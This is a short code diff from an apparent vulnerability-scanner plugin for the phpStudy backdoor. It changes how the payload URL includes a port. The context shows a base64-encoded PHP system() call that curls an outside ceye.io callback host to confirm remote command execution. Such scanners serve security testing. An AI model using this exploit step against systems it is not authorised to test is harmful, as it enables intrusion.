@@ -40,7 +40,7 @@ def medusa(Url,RandomAgent,ProxyIp):
     commandS = ('''system("curl http://{}_phpStudy_backdoor_{}.7ktb2x.ceye.io");''').format(url, Random)
     cmd = base64.b64encode(commandS.encode('utf-8'))
     try:
-        payload_url = scheme+"://"+url+payload
+        payload_url = scheme+"://"+url+ ':' + str(port)+payload
         headers = {
             'Sec-Fetch-Mode': 'navigate',
             'Sec-Fetch-User': '?1',
